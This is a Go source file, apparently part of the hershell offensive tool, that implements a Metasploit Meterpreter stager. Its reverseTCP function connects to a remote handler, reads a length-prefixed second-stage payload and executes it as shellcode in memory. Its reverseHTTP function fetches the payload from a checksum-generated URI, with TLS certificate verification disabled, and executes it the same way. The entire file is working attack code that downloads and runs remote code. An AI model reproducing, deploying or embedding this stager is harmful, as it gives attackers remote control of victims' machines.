package meterpreter

import (
	"crypto/tls"
	"encoding/binary"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"runtime"
	"time"

	"github.com/lesnuages/hershell/shell"
)

// Meterpreter function allows to connect back
// to either a TCP or HTTP(S) reverse handler
func Meterpreter(connType, address string) (bool, error) {
	var (
		ok  bool
		err error
	)
	switch {
	case connType == "http" || connType == "https":
		ok, err = reverseHTTP(connType, address)
	case connType == "tcp":
		ok, err = reverseTCP(address)
	default:
		ok = false
	}

	return ok, err
}

func getRandomString(length int, charset string) string {
	seed := rand.New(rand.NewSource(time.Now().UnixNano()))
	buf := make([]byte, length)
	for i := range buf {
		buf[i] = charset[seed.Intn(len(charset))]
	}
	return string(buf)
}

// See https://github.com/rapid7/metasploit-framework/blob/7a6a124272b7c52177a540317c710f9a3ac925aa/lib/rex/payloads/meterpreter/uri_checksum.rb
func getURIChecksumID() int {
	var res int = 0
	switch runtime.GOOS {
	case "windows":
		res = 92
	case "linux":
		res = 95
	default:
		res = 92
	}
	return res
}

func generateURIChecksum(length int) string {
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
	for {
		checksum := 0
		uriString := getRandomString(length, charset)
		for _, value := range uriString {
			checksum += int(value)
		}
		if (checksum % 0x100) == getURIChecksumID() {
			return uriString
		}
	}
}

func reverseTCP(address string) (bool, error) {
	var (
		stage2LengthBuf []byte = make([]byte, 4)
		tmpBuf          []byte = make([]byte, 2048)
		read                   = 0
		totalRead              = 0
		stage2LengthInt uint32 = 0
		conn            net.Conn
		err             error
	)

	if conn, err = net.Dial("tcp", address); err != nil {
		return false, err
	}

	defer conn.Close()

	if _, err = conn.Read(stage2LengthBuf); err != nil {
		return false, err
	}

	stage2LengthInt = binary.LittleEndian.Uint32(stage2LengthBuf[:])
	stage2Buf := make([]byte, stage2LengthInt)

	for totalRead < (int)(stage2LengthInt) {
		if read, err = conn.Read(tmpBuf); err != nil {
			return false, err
		}
		totalRead += read
		stage2Buf = append(stage2Buf, tmpBuf[:read]...)
	}

	shell.ExecShellcode(stage2Buf)

	return true, nil
}

func reverseHTTP(connType, address string) (bool, error) {
	var (
		resp *http.Response
		err  error
	)
	url := connType + "://" + address + "/" + generateURIChecksum(12)
	if connType == "https" {
		transport := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client := &http.Client{Transport: transport}
		resp, err = client.Get(url)
	} else {
		resp, err = http.Get(url)
	}
	if err != nil {
		return false, err
	}

	defer resp.Body.Close()

	stage2buf, _ := ioutil.ReadAll(resp.Body)
	shell.ExecShellcode(stage2buf)

	return true, nil
}
